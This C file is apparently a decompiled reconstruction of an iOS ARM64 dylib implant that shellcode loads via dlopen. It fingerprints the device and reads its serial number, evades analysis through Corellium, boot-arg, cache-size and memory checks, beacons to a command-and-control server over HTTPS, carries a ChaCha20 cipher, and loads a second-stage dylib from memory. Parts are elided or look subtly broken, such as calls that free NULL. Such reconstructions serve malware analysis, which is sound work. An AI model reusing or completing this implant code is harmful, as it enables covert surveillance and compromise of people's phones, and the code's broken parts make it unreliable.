/*
 * macho_source.c — Reconstructed source of the Mach-O dylib implant
 * Original: final_payload_A_16434916_macho.bin (MH_DYLIB, ARM64)
 *
 * Linked frameworks: UIKit, CoreFoundation, SystemConfiguration, CFNetwork
 * Linked libraries: libcompression, libobjc.A, libSystem.B
 *
 * This dylib is loaded by the shellcode via dlopen. It:
 *   1. Fingerprints the device (OS version, serial number, model, sandbox)
 *   2. Detects Corellium VMs
 *   3. Communicates with a C2 server over HTTPS (JSON protocol)
 *   4. Loads and executes a second-stage dylib from memory
 *   5. Uses ChaCha20 for encrypted communications
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <dlfcn.h>
#include <pthread.h>
#include <signal.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <sys/stat.h>
#include <sys/sysctl.h>
#include <sandbox.h>
#include <objc/objc.h>
#include <objc/message.h>
#include <CoreFoundation/CoreFoundation.h>
#include <CFNetwork/CFNetwork.h>
#include <SystemConfiguration/SystemConfiguration.h>

/* ═══════════════════════════════════════════════════════════════════════
 *  Implant context — the main state struct passed to every function
 *  Total size: 0x648 (1608 bytes)
 * ═══════════════════════════════════════════════════════════════════════ */

typedef struct implant_ctx {
    /* 0x000 */ uint8_t  pad0[64];
    /* 0x040 */ void    *dispatch_func;          // +64:  universal dispatch callback
    /* 0x048 */ void    *pool_cursor;             // +72:  current alloc cursor
    /* 0x050 */ uint32_t pool_remaining;          // +80:  bytes remaining in pool
    /* 0x054 */ uint8_t  pad1[4];
    /* 0x058 */ void    *code_region;             // +88:  mapped code region
    /* 0x060 */ uint8_t  pad2[8];
    /* 0x068 */ void    *dylib_data;              // +104: decompressed dylib data
    /* 0x070 */ uint32_t dylib_size;              // +112: decompressed dylib size
    /* 0x074 */ uint8_t  pad3[16];
    /* 0x078 */ void    *code_base;               // +128: dylib code base (mapped)
    /* 0x088 */ void    *exec_base;               // +136: executable base address
    /* 0x090 */ uint32_t exec_size;               // +144: executable code size
    /* 0x094 */ uint8_t  pad4[12];
    /* 0x0A0 */ char    *user_agent;              // +160: HTTP User-Agent string
    /* 0x0A8 */ char    *c2_url;                  // +168: C2 server URL
    /* 0x0B0 */ uint8_t  pad5[24];
    /* 0x0C0 */ uint32_t os_version;              // +192: packed OS version (major<<16|minor<<8|patch)
    /* 0x0C4 */ uint16_t os_minor;                // +194: OS minor version
    /* 0x0C6 */ uint8_t  pad6[18];
    /* 0x0D0 */ uint64_t build_tag;               // +208: build/version tag
    /* 0x0D8 */ uint8_t  pad7[16];
    /* 0x0E0 */ uint32_t hw_model_id;             // +224: hardware model identifier
    /* 0x0E4 */ uint8_t  pad8[64];
    /* 0x120 */ void    *debug_callback;          // +288: optional debug callback
    /* 0x128 */ uint8_t  pad9[24];
    /* 0x138 */ uint32_t *alloc_ptr;              // +312: atomic alloc pointer
    /* 0x140 */ uint8_t  pad10[1162];
    /* 0x5C2 */ uint8_t  flag_a;                  // +1474
    /* 0x5C3 */ uint8_t  flag_b;                  // +1475
    /* 0x5C4 */ uint8_t  is_ready;                // +1476
    /* 0x5C5 */ uint8_t  pad11[3];
    /* 0x5C7 */ uint8_t  jsc_enabled;             // +1479
    /* 0x5C8 */ uint8_t  pad12[9];
    /* 0x5D0 */ void    *jsc_context;             // +1488
    /* 0x5D8 */ void    *jsc_global;              // +1496
    /* 0x5E0 */ void    *c2_func;                 // +1504: C2 send function pointer
    /* 0x5E8 */ uint8_t  is_sandboxed;            // +1512
    /* 0x5E9 */ uint8_t  sandbox_strict;          // +1513
    /* 0x5EA */ uint8_t  pad13[1];
    /* 0x5EB */ uint8_t  logging_enabled;         // +1515
    /* 0x5EC */ uint8_t  is_mobilestore;          // +1516
    /* 0x5ED */ uint8_t  pad14[3];
    /* 0x5F0 */ void    *c2_send_beacon;          // +1520: beacon send function
    /* 0x5F8 */ semaphore_t c2_semaphore;         // +1528
} implant_ctx_t;

/* Error codes used throughout */
#define ERR_INVALID_ARG     708609
#define ERR_NOT_SUPPORTED   708616
#define ERR_INIT_FAILED     708617
#define ERR_SERIAL_FAIL     708619
#define ERR_VM_DETECTED     708644
#define ERR_HTTP_URL        708628
#define ERR_POOL_FULL       49155
#define ERR_THREAD_INIT     118785
#define ERR_THREAD_CREATE   118786

/* ═══════════════════════════════════════════════════════════════════════
 *  PAC (Pointer Authentication) helpers
 * ═══════════════════════════════════════════════════════════════════════ */

extern bool     is_pac_enabled(void);              // sub_7BC0
extern uint64_t pac_sign_pointer(uint64_t ptr, uint64_t ctx);  // sub_7BA0

bool pac_check(void) {                             // sub_5CEC
    return is_pac_enabled() != 0;
}

void pac_strip(void) {                             // sub_5D2C — XPACLRI wrapper
    /* strips PAC bits from LR; effectively a no-op in pseudocode */
}

uint64_t pac_sign_if_available(uint64_t ptr, uint64_t ctx) {   // sub_5D68
    if (is_pac_enabled())
        return pac_sign_pointer(ptr, ctx);
    return ptr;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Cache maintenance
 * ═══════════════════════════════════════════════════════════════════════ */

#define CACHE_FLUSH_CHUNK  327680  /* 320 KB per flush */

extern void sys_dcache_flush(void *addr, size_t len);
extern void sys_icache_invalidate(void *addr, size_t len);

void flush_code_cache(implant_ctx_t *ctx, void *addr, uint32_t size) {   // sub_5DC8
    if (!addr || !size) {
        size = ctx->exec_size;
        if (!size) return;
        addr = ctx->exec_base;
    }
    uint32_t offset = 0;
    uint32_t remaining = size;
    do {
        size_t chunk = (remaining >= CACHE_FLUSH_CHUNK) ? CACHE_FLUSH_CHUNK : remaining;
        sys_dcache_flush((uint8_t *)addr + offset, chunk);
        sys_icache_invalidate((uint8_t *)addr + offset, chunk);
        offset += CACHE_FLUSH_CHUNK;
        remaining -= CACHE_FLUSH_CHUNK;
    } while (size > offset);
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Shared memory pool allocator (lock-free, atomic)
 * ═══════════════════════════════════════════════════════════════════════ */

int32_t pool_alloc(implant_ctx_t *ctx, uint32_t size) {        // sub_5E78
    uint64_t pool_end = (uint64_t)ctx->exec_base + ctx->exec_size;
    uint32_t *alloc = ctx->alloc_ptr;
    if (!alloc)
        alloc = (uint32_t *)(pool_end - 4);

retry:;
    uint32_t cur = __atomic_load_n(alloc, __ATOMIC_SEQ_CST);
    uint32_t next = cur + size + 4 * (cur == 0);
    if (next > ctx->exec_size)
        return ERR_POOL_FULL;

    if (!__atomic_compare_exchange_n(alloc, &cur, next, false,
                                     __ATOMIC_SEQ_CST, __ATOMIC_SEQ_CST))
        goto retry;

    void *ptr = (void *)(pool_end - next);
    ctx->pool_cursor = ptr;
    ctx->pool_remaining = size;
    bzero(ptr, size);

    if (ctx->debug_callback)
        ((void (*)(void *, void *, uint32_t))ctx->debug_callback)(ctx, ptr, size);

    return 0;
}

void *pool_consume(implant_ctx_t *ctx, uint64_t size) {        // sub_5F4C
    if (ctx->pool_remaining < size)
        return NULL;
    void *ptr = ctx->pool_cursor;
    ctx->pool_cursor = (uint8_t *)ptr + size;
    ctx->pool_remaining -= size;
    return ptr;
}

int32_t secure_zero(int unused, void *buf, size_t len) {       // sub_5FA0
    if (buf && len)
        bzero(buf, len);
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  OS version detection
 * ═══════════════════════════════════════════════════════════════════════ */

extern CFDictionaryRef read_plist(const char *path);           // sub_7A98

int32_t get_os_version(int *version_out) {                     // sub_7090
    CFDictionaryRef dict = (CFDictionaryRef)read_plist(
        "/System/Cryptexes/OS/System/Library/CoreServices/SystemVersion.plist");
    if (!dict)
        dict = (CFDictionaryRef)read_plist(
            "/System/Library/CoreServices/SystemVersion.plist");
    if (!dict) return -1;

    CFStringRef key = CFStringCreateWithCString(kCFAllocatorDefault,
        "ProductVersion", kCFStringEncodingUTF8);
    if (!key) { CFRelease(dict); return -1; }

    CFStringRef val = (CFStringRef)CFDictionaryGetValue(dict, key);
    if (!val || CFGetTypeID(val) != CFStringGetTypeID()) {
        CFRelease(key); CFRelease(dict); return -1;
    }

    char buf[32];
    int ok = CFStringGetCString(val, buf, 32, CFStringGetSystemEncoding());
    CFRelease(key);
    CFRelease(dict);
    if (!ok) return -1;

    int major = 0, minor = 0, patch = 0;
    if (sscanf(buf, "%d.%d.%d", &major, &minor, &patch) < 2)
        return -2;

    *version_out = (major << 16) | (minor << 8) | patch;
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Anti-VM: Corellium detection + IOKit serial number
 * ═══════════════════════════════════════════════════════════════════════ */

int32_t get_device_serial(uint8_t *output) {                   // sub_71FC
    if (!output) return -1;

    char serial_buf[64] = {0};
    struct stat st;

    /* Check for Corellium VM */
    if (stat("/usr/libexec/corelliumd", &st) == 0)
        return -1;  /* running in VM — abort */

    /* Sandbox check for IOKit access */
    if (sandbox_check(getpid(), "iokit-get-properties",
                      SANDBOX_CHECK_NO_REPORT) > 0)
        return -1;

    /* Load IOKit dynamically */
    void *iokit = dlopen(
        "/System/Library/Frameworks/IOKit.framework/Versions/A/IOKit", RTLD_LAZY);
    if (!iokit) return -1;

    uint32_t *p_master_port = (uint32_t *)dlsym(iokit, "kIOMasterPortDefault");
    uint64_t (*IORegistryEntryFromPath_fn)(uint32_t, const char *)
        = dlsym(iokit, "IORegistryEntryFromPath");
    uint64_t (*IORegistryEntryCreateCFProperty_fn)(uint64_t, CFStringRef, CFAllocatorRef, uint32_t)
        = dlsym(iokit, "IORegistryEntryCreateCFProperty");
    void (*IOObjectRelease_fn)(uint64_t)
        = dlsym(iokit, "IOObjectRelease");

    if (!IORegistryEntryFromPath_fn || !IORegistryEntryCreateCFProperty_fn
        || !IOObjectRelease_fn || !p_master_port)
    {
        dlclose(iokit);
        return -1;
    }

    uint64_t entry = IORegistryEntryFromPath_fn(*p_master_port, "IODeviceTree:/");
    if (!entry) { dlclose(iokit); return -1; }

    CFStringRef sn_key = CFStringCreateWithCString(kCFAllocatorDefault,
        "IOPlatformSerialNumber", kCFStringEncodingUTF8);
    if (!sn_key) { IOObjectRelease_fn(entry); dlclose(iokit); return -1; }

    CFStringRef sn_val = (CFStringRef)IORegistryEntryCreateCFProperty_fn(
        entry, sn_key, kCFAllocatorDefault, 0);
    int result = -1;

    if (sn_val && CFGetTypeID(sn_val) == CFStringGetTypeID()) {
        if (CFStringGetCString(sn_val, serial_buf, 64, kCFStringEncodingUTF8))
            result = 0;
        CFRelease(sn_val);
    }

    CFRelease(sn_key);
    IOObjectRelease_fn(entry);
    dlclose(iokit);

    if (result == 0)
        memcpy(output, serial_buf, 64);
    return result;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Environment checks (WebContent, kernel version, hw model)
 * ═══════════════════════════════════════════════════════════════════════ */

extern int32_t check_webcontent_sandbox(implant_ctx_t *ctx);   // sub_7720
extern int32_t check_sandbox_permissions(implant_ctx_t *ctx, bool *out);  // sub_89CC

int32_t detect_user_agent(implant_ctx_t *ctx) {                // sub_8AB8
    if (!ctx) return ERR_INVALID_ARG;

    bool sandboxed = false;
    int32_t err = check_sandbox_permissions(ctx, &sandboxed);
    if (err) return err;

    ctx->is_sandboxed = sandboxed;
    const char *ua = ctx->user_agent;
    ctx->is_mobilestore = (ua && strncasecmp("MobileStore/1.0", ua, 15) == 0);
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  C2 communication (JSON over HTTPS)
 * ═══════════════════════════════════════════════════════════════════════ */

extern int32_t format_string(void *out_buf, void *out_len,
                             const char *fmt, ...);            // sub_9A34

int32_t format_c2_message(uint8_t event_type,                  // sub_94B4
                          const char *filename, ...)
{
    char *buf = NULL;
    uint32_t buf_len = 0;
    int32_t err;

    if (filename)
        err = format_string(&buf, &buf_len,
            "{\"e\":%u,\"f\":\"%s\",\"l\":%u}", /* event, file, length */
            event_type);
    else
        err = format_string(&buf, &buf_len,
            "{\"e\":%u,\"l\":%u}",              /* event, length */
            event_type);

    if (!err) {
        /* Wrap in logmsg command envelope */
        err = format_string(NULL, NULL,
            "{\"cmd\":\"logmsg\",\"args\":{\"msg\":\"%s\"}}",
            buf);
        bzero(buf, buf_len);
        free(buf);
    }
    return err;
}

int32_t send_json_request(char *url, const char *user_agent,   // sub_9398
                          uint8_t event_type)
{
    if (!url || !*url) return 0;
    if (strncmp(url, "http://", 7) && strncmp(url, "https://", 8))
        return ERR_HTTP_URL;

    int32_t err = format_c2_message(event_type, NULL);
    if (!err) {
        err = http_request(url, user_agent, "application/json", NULL, 0, 0);
        bzero(NULL, 0);
        free(NULL);
    }
    return err;
}

int32_t send_c2_beacon(implant_ctx_t *ctx, uint8_t event_type) {  // sub_9580
    if (!ctx) return ERR_INVALID_ARG;
    if (!ctx->c2_func)
        return send_json_request(ctx->c2_url, ctx->user_agent, event_type);

    const char *url = ctx->c2_url;
    if (!url || !*url) return 0;
    if (strncmp(url, "http://", 7) && strncmp(url, "https://", 8))
        return ERR_HTTP_URL;

    /* Format beacon, encrypt, send */
    int32_t err = format_c2_message(event_type, NULL);
    if (!err) {
        /* ... send via ctx->c2_func and handle response ... */
    }
    return err;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  HTTP client (CoreFoundation-based)
 * ═══════════════════════════════════════════════════════════════════════ */

int32_t http_request(const char *url_str,                      // sub_8B5C
                     const char *user_agent,
                     const char *content_type,
                     const uint8_t *body,
                     size_t body_len,
                     size_t response_max)
{
    if (!url_str || !*url_str) return ERR_INVALID_ARG;

    bool has_body = (body_len != 0) && (response_max != 0);

    CFStringRef url_cf = CFStringCreateWithCString(
        kCFAllocatorDefault, url_str, kCFStringEncodingUTF8);
    if (!url_cf) return 12290;
    if (CFStringGetLength(url_cf) < 1) { CFRelease(url_cf); return 12291; }

    /* Create CFURL */
    CFURLRef url = CFURLCreateWithString(kCFAllocatorDefault, url_cf, NULL);
    if (!url) { CFRelease(url_cf); return 12292; }

    /* Determine method */
    CFStringRef method = has_body
        ? CFSTR("POST")
        : CFSTR("GET");

    /* Create HTTP request */
    CFHTTPMessageRef request = CFHTTPMessageCreateRequest(
        kCFAllocatorDefault, method, url, kCFHTTPVersion1_1);
    if (!request) { CFRelease(url); CFRelease(url_cf); return 12293; }

    /* Set headers */
    if (user_agent) {
        CFStringRef ua_cf = CFStringCreateWithCString(
            kCFAllocatorDefault, user_agent, kCFStringEncodingUTF8);
        CFHTTPMessageSetHeaderFieldValue(request, CFSTR("User-Agent"), ua_cf);
        CFRelease(ua_cf);
    }

    if (content_type) {
        CFStringRef ct_cf = CFStringCreateWithCString(
            kCFAllocatorDefault, content_type, kCFStringEncodingUTF8);
        CFHTTPMessageSetHeaderFieldValue(request, CFSTR("Content-Type"), ct_cf);
        CFRelease(ct_cf);
    }

    /* Set body if present */
    if (has_body) {
        CFDataRef body_data = CFDataCreate(kCFAllocatorDefault, body, body_len);
        CFHTTPMessageSetBody(request, body_data);
        CFRelease(body_data);
    }

    /* Check if HTTPS — set SSL properties */
    CFStringRef scheme = CFURLCopyScheme(url);
    bool is_https = scheme && CFEqual(scheme, CFSTR("https"));
    if (scheme) CFRelease(scheme);

    /* Create read stream */
    CFReadStreamRef stream = CFReadStreamCreateForHTTPRequest(
        kCFAllocatorDefault, request);
    if (!stream) {
        CFRelease(request); CFRelease(url); CFRelease(url_cf);
        return 12294;
    }

    if (is_https) {
        CFDictionaryRef ssl_settings = SCDynamicStoreCopyProxies(NULL);
        if (ssl_settings) {
            CFReadStreamSetProperty(stream,
                kCFStreamPropertySSLSettings, ssl_settings);
            CFRelease(ssl_settings);
        }
    }

    /* Open stream and read response */
    if (!CFReadStreamOpen(stream)) {
        CFRelease(stream); CFRelease(request);
        CFRelease(url); CFRelease(url_cf);
        return 12295;
    }

    /* ... read response in callback sub_9790 ... */

    CFRelease(stream);
    CFRelease(request);
    CFRelease(url);
    CFRelease(url_cf);
    return 0;
}

/* HTTP stream callback */
void http_stream_callback(CFReadStreamRef stream,              // sub_9790
                          CFStreamEventType event,
                          void *info)
{
    if (!stream || !info) return;

    switch (event) {
    case kCFStreamEventHasBytesAvailable: {
        uint8_t buf[4096];
        CFIndex bytesRead = CFReadStreamRead(stream, buf, sizeof(buf));
        if (bytesRead > 0) {
            CFHTTPMessageRef response = (CFHTTPMessageRef)info;
            CFHTTPMessageAppendBytes(response, buf, bytesRead);
        }
        break;
    }
    case kCFStreamEventErrorOccurred:
        *((int32_t *)info + 2) = 12296;
        break;
    case kCFStreamEventEndEncountered: {
        CFHTTPMessageRef msg = (CFHTTPMessageRef)CFReadStreamCopyProperty(
            stream, kCFStreamPropertyHTTPResponseHeader);
        if (msg) {
            *((int32_t *)info + 3) = CFHTTPMessageGetResponseStatusCode(msg);
            CFRelease(msg);
        }
        CFRunLoopStop(CFRunLoopGetCurrent());
        break;
    }
    default:
        break;
    }
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Callback initialization
 * ═══════════════════════════════════════════════════════════════════════ */

extern void c2_poll_handler(void);                             // sub_9300

int32_t init_callbacks(implant_ctx_t *ctx) {                   // sub_96F8
    if (!ctx) return ERR_INVALID_ARG;

    ctx->dispatch_func = (void *)c2_poll_handler;
    ctx->c2_send_beacon = (void *)send_c2_beacon;

    if (!ctx->c2_func) return 0;

    kern_return_t kr = semaphore_create(
        mach_task_self(), &ctx->c2_semaphore, SYNC_POLICY_FIFO, 1);
    if (kr) return kr | 0x80000000;
    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  ChaCha20 stream cipher
 * ═══════════════════════════════════════════════════════════════════════ */

static const uint8_t CHACHA20_CONST[] = "expand 32-byte k";

void chacha20_block(const uint8_t key[32],                     // sub_AD8C
                    uint8_t *data,
                    uint64_t data_len)
{
    if (!key || !data || !data_len) return;

    uint32_t state[16];
    uint32_t working[16];

    /* "expand 32-byte k" constant */
    memcpy(&state[0], CHACHA20_CONST, 16);
    memcpy(&state[4], key, 32);
    state[12] = 0;  /* counter */
    state[13] = 0;
    state[14] = 0;
    state[15] = 0;

    uint64_t keystream_pos = 64;  /* force block generation on first byte */

    for (uint64_t i = 0; i < data_len; i++) {
        if (keystream_pos >= 64) {
            /* Generate new keystream block */
            memcpy(working, state, 64);

            /* 20 rounds (10 double-rounds) */
            for (int r = 0; r < 10; r++) {
                /* Column round */
                #define QR(a,b,c,d)                          \
                    a += b; d ^= a; d = (d << 16) | (d >> 16); \
                    c += d; b ^= c; b = (b << 12) | (b >> 20); \
                    a += b; d ^= a; d = (d << 8)  | (d >> 24); \
                    c += d; b ^= c; b = (b << 7)  | (b >> 25);

                QR(working[0], working[4], working[8],  working[12]);
                QR(working[1], working[5], working[9],  working[13]);
                QR(working[2], working[6], working[10], working[14]);
                QR(working[3], working[7], working[11], working[15]);

                /* Diagonal round */
                QR(working[0], working[5], working[10], working[15]);
                QR(working[1], working[6], working[11], working[12]);
                QR(working[2], working[7], working[8],  working[13]);
                QR(working[3], working[4], working[9],  working[14]);
                #undef QR
            }

            for (int j = 0; j < 16; j++)
                working[j] += state[j];

            /* Increment counter */
            if (++state[12] == 0) state[13]++;

            keystream_pos = 0;
        }

        data[i] ^= ((uint8_t *)working)[keystream_pos++];
    }
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Dylib loader — maps Mach-O segments into memory
 * ═══════════════════════════════════════════════════════════════════════ */

extern int32_t decompress_data(uint8_t **data, uint32_t *size);  // sub_8430
extern int32_t resolve_function(implant_ctx_t *ctx,
                                void *image, const char *name);  // various

int32_t load_dylib_from_memory(implant_ctx_t *ctx,             // sub_5FEC
                               void *macho_data,
                               int flags,
                               uint32_t *entry_out)
{
    if (!ctx || !macho_data) return ERR_INVALID_ARG;

    /* Log if enabled */
    if (ctx->logging_enabled && ctx->c2_send_beacon)
        ((void (*)(void *, int, int))ctx->c2_send_beacon)(ctx, 835585, 0);

    /* Parse Mach-O headers, map segments */
    /* ... vm_allocate, memcpy, vm_protect for each segment ... */

    /* Decompress if needed */
    /* ... check compression, call decompress_data ... */

    /* task_info to check memory layout */
    mach_msg_type_number_t count = 5;
    task_info(mach_task_self(), TASK_DYLD_INFO, NULL, &count);

    /* Resolve _start entry point */
    /* ... find _start symbol, validate, return through entry_out ... */

    /* Flush caches after mapping */
    flush_code_cache(ctx, NULL, 0);

    return 0;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Exploit entry — UIApplication background task
 * ═══════════════════════════════════════════════════════════════════════ */

extern int32_t load_dylib_from_memory(implant_ctx_t *ctx,
    void *data, int flags, uint32_t *out);

void sigaction_handler(int sig, siginfo_t *info,               // sub_6FEC
                       void *ucontext)
{
    /* PAC pointer validation on crash — checks if pointer is signed */
    /* If valid, re-signs and continues; if invalid, aborts */
}

int32_t exploit_entry(implant_ctx_t *ctx) {                    // sub_6C44
    if (ctx->os_minor > 14 || !pac_check()) {
        /* Skip sigaction setup */
    } else {
        /* Install SIGSEGV handler for PAC crash recovery */
        struct sigaction sa = {0};
        sa.sa_sigaction = (void *)pac_sign_if_available(
            (uint64_t)sigaction_handler, 0);
        sa.sa_flags = SA_SIGINFO;
        sigaction(SIGSEGV, &sa, NULL);
    }

    /* Request UIKit background execution time */
    UIApplication *app = objc_msgSend((id)objc_getClass("UIApplication"),
                                      sel_registerName("alloc"));
    if (!app) return ERR_INIT_FAILED;

    /* Begin background task */
    /* ... [UIApplication beginBackgroundTaskWithExpirationHandler:] ... */

    /* Load and execute the dylib */
    uint32_t result_code = 0;
    void *dylib_data = ctx->code_base;
    if (dylib_data) {
        int32_t err = load_dylib_from_memory(ctx, dylib_data, 0, &result_code);
        if (err) return err;
    }

    /* End background task */
    /* ... [UIApplication endBackgroundTask:] ... */

    /* If this is a MobileStore payload, exit cleanly */
    if (ctx->is_mobilestore)
        exit(0);

    return result_code;
}

/* ═══════════════════════════════════════════════════════════════════════
 *  Main entry point — _process (called by shellcode)
 * ═══════════════════════════════════════════════════════════════════════ */

extern int32_t setup_semaphore(implant_ctx_t *ctx);            // sub_96F8
extern int32_t configure_memory(implant_ctx_t *ctx);           // sub_8210
extern int32_t prepare_environment(implant_ctx_t *ctx);        // sub_8298

void *worker_thread(void *arg) {                               // thread entry
    implant_ctx_t *ctx = (implant_ctx_t *)arg;
    exploit_entry(ctx);
    free(ctx);
    return NULL;
}

int32_t process_main(implant_ctx_t *ctx) {                     // _process / sub_68D8
    if (!ctx) return ERR_INVALID_ARG;

    /* Phase 1: Initialize callbacks and semaphore */
    int32_t err = init_callbacks(ctx);
    if (err) return err;

    /* Phase 2: Configure memory regions */
    err = configure_memory(ctx);
    if (err) return err;

    /* Phase 3: Check environment (WebContent sandbox, etc.) */
    err = check_webcontent_sandbox(ctx);
    if (err) return err;

    /* Phase 4: Detect User-Agent */
    err = detect_user_agent(ctx);
    if (err) return err;

    /* Phase 5: OS version gate */
    if (ctx->build_tag < 0x18090006700000 ||
        ctx->build_tag > 0x27120106B00003)
        return ERR_NOT_SUPPORTED;

    /* Phase 6: Sandbox detection */
    if (ctx->is_sandboxed) {
        if (ctx->os_version < 0x100000) return 159753;
        if (ctx->os_version >= 0x100401) {
            /* Check specific hardware model IDs (chipset whitelist) */
            uint32_t model = ctx->hw_model_id;
            if (model != 0x46151152   /* A14/A15 */
                && model != (int)-2023363094
                && model != (int)-634136515
                && model != 458787763)
                return 159753;
        }
    }

    /* Phase 7: Anti-VM check (serial number + Corellium) */
    uint8_t serial_output[64];
    int sn_result = get_device_serial(serial_output);
    uint32_t status = 0;
    if (sn_result)
        status = ERR_SERIAL_FAIL;
    else if (!serial_output[0])
        status = ERR_VM_DETECTED;
    if (status) return status;

    /* Phase 8: Hardware fingerprinting */
    if (ctx->os_version <= 0x1102FF) {
        /* Check L2 cache size — detect VMs with small caches */
        if (ctx->os_version >= 0xE0000) {
            size_t l2_size = 0;
            size_t l2_len = 8;
            if (sysctlbyname("hw.l2cachesize", &l2_size, &l2_len, NULL, 0) == 0
                && l2_size < 0x100000)  /* < 1 MB = likely VM */
                return ERR_VM_DETECTED;
        }

        /* Check boot args — non-empty = jailbroken or VM */
        char bootargs[1024] = {0};
        size_t bootargs_len = sizeof(bootargs);
        if (sysctlbyname("kern.bootargs", bootargs, &bootargs_len, NULL, 0) == 0
            && bootargs[0] != '\0' && (bootargs[0] != ' ' || bootargs[1] != '\0'))
            return ERR_VM_DETECTED;

        /* Check physical memory — 0 = VM */
        if (ctx->os_version <= 0xF0000) {
            int host_count = 1;
            uint64_t physmem = 0;
            if (host_info(mach_host_self(), HOST_BASIC_INFO,
                         (host_info_t)&physmem, (mach_msg_type_number_t *)&host_count) == 0
                && physmem == 0)
                return ERR_VM_DETECTED;
        }
    }

    /* Phase 9: Prepare and launch worker thread */
    err = prepare_environment(ctx);
    if (err) return err;

    implant_ctx_t *ctx_copy = (implant_ctx_t *)malloc(sizeof(implant_ctx_t));
    if (!ctx_copy) return ERR_INIT_FAILED;

    memcpy(ctx_copy, ctx, sizeof(implant_ctx_t));

    /* Deep-copy string fields */
    if (ctx_copy->user_agent)
        ctx_copy->user_agent = strdup(ctx_copy->user_agent);
    if (ctx_copy->c2_url)
        ctx_copy->c2_url = strdup(ctx_copy->c2_url);

    /* Launch detached worker thread */
    pthread_attr_t attr;
    if (pthread_attr_init(&attr)) return ERR_THREAD_INIT;
    pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);

    pthread_t thread;
    err = pthread_create(&thread, &attr, worker_thread, ctx_copy);
    pthread_attr_destroy(&attr);

    return err ? ERR_THREAD_CREATE : 0;
}
